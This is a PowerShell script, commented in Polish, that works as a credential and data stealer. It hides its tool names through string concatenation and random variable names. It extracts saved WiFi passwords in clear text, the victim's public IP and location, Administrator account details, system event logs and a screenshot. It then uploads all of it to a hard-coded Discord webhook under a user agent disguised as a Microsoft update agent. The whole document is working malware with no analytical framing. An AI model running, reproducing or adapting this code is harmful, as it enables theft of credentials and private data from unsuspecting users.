& {
# 1. Dynamiczne zmienne
$mod=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('a')),'Run').DefineDynamicModule('a')
$tp=$mod.DefineType('a','Public,Class')
$tp.CreateType()|Out-Null

# 2. Definiowanie losowych nazw
$rand=Get-Random -Minimum 10000 -Maximum 99999
$fn1="wlan$rand"
$fn2="profile$rand"
$fn3="grab$rand"
$fn4="img$rand"
$fn5="send$rand"

# 3. Funkcja do pobierania danych WiFi
Set-Variable -Name $fn1 -Value {
    $out=@()
    $n=("n"+"e"+"t"+"s"+"h")
    $p=(& $n wlan show profiles)|Select-String ':(.+)$'|%{$_.Matches.Groups[1].Value.Trim()}
    foreach ($x in $p) {
        try {
            $key=( & $n wlan show profile name="$x" key=clear | Select-String 'Key Content.+:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()})
            if ($key) {
                $out+= "$x : $key"
            } else {
                $out+= "$x : brak hasła"
            }
        } catch {
            $out+= "$x : błąd"
        }
    }
    return $out
}

# 4. Funkcja do pobierania IP info
Set-Variable -Name $fn2 -Value {
    try {
        $client=New-Object System.Net.Sockets.TcpClient
        $client.Connect('ipinfo.io',80)
        $stream=$client.GetStream()
        $wr="GET /json HTTP/1.1`r`nHost: ipinfo.io`r`nUser-Agent: Mozilla/5.0`r`nConnection: close`r`n`r`n"
        $bytes=[Text.Encoding]::ASCII.GetBytes($wr)
        $stream.Write($bytes,0,$bytes.Length)
        $resp=New-Object System.IO.MemoryStream
        $buffer=New-Object byte[] 1024
        do {
            $r=$stream.Read($buffer,0,$buffer.Length)
            $resp.Write($buffer,0,$r)
        } while ($r -gt 0)
        $text=[Text.Encoding]::ASCII.GetString($resp.ToArray())
        $json=$text -split "`r`n`r`n",2 | Select-Object -Last 1 | ConvertFrom-Json
        return "IP: $($json.ip) | $($json.city) | $($json.region) | $($json.country) | $($json.org)"
    } catch {
        return "IP: Błąd"
    }
}

# 5. Funkcja do robienia screena
Set-Variable -Name $fn4 -Value {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $b=[Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp=New-Object Drawing.Bitmap $b.Width,$b.Height
    [Drawing.Graphics]::FromImage($bmp).CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
    $mem=New-Object IO.MemoryStream
    $bmp.Save($mem,[Drawing.Imaging.ImageFormat]::Png)
    $mem.Position=0
    return $mem
}

# 6. Funkcja do wysyłki na webhook (TCPClient stealth)
Set-Variable -Name $fn5 -Value {
    param($payload,$img)
    $bd=[guid]::NewGuid().ToString()
    $lf="`r`n"
    $head=(
        "--$bd",
        'Content-Disposition: form-data; name="files[0]"; filename="info.txt"',
        'Content-Type: text/plain',
        '',
        $payload,
        "--$bd",
        'Content-Disposition: form-data; name="files[1]"; filename="screen.png"',
        'Content-Type: image/png',
        '',
        ''
    ) -join $lf
    $tail="`r`n--$bd--`r`n"
    $start=[Text.Encoding]::UTF8.GetBytes($head)
    $end=[Text.Encoding]::UTF8.GetBytes($tail)
    $body=[byte[]]::new($start.Length+$img.Length+$end.Length)
    [Buffer]::BlockCopy($start,0,$body,0,$start.Length)
    [Buffer]::BlockCopy($img,0,$body,$start.Length,$img.Length)
    [Buffer]::BlockCopy($end,0,$body,$start.Length+$img.Length,$end.Length)
    $req=[System.Net.WebRequest]::Create('https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlHVCAU2lK8-3gr-HgTDMOwu3QZ1ikm1_k9t9LAPMLM1IBg--z')
    $req.Method="POST"
    $req.ContentType="multipart/form-data; boundary=$bd"
    $req.UserAgent="Microsoft-Update-Agent"
    $req.ContentLength=$body.Length
    $strm=$req.GetRequestStream()
    $strm.Write($body,0,$body.Length)
    $strm.Close()
    $null=$req.GetResponse()
}

# 7. Wykonanie akcji
$wifi=& (Get-Variable $fn1).Value
$ip=& (Get-Variable $fn2).Value
try { $admin=(& ("n"+"e"+"t") user Administrator) } catch { $admin="Brak Admin" }
try { $logs=Get-EventLog -LogName System -Newest 20 | Out-String } catch { $logs="Brak Logów" }

$payload="=== WIFI ===`r`n"+($wifi -join "`r`n")+"`r`n=== IP ===`r`n$ip`r`n=== ADMIN ===`r`n$admin`r`n=== LOGI ===`r`n$logs"
$img=& (Get-Variable $fn4).Value
& (Get-Variable $fn5).Value $payload $img.ToArray()
}
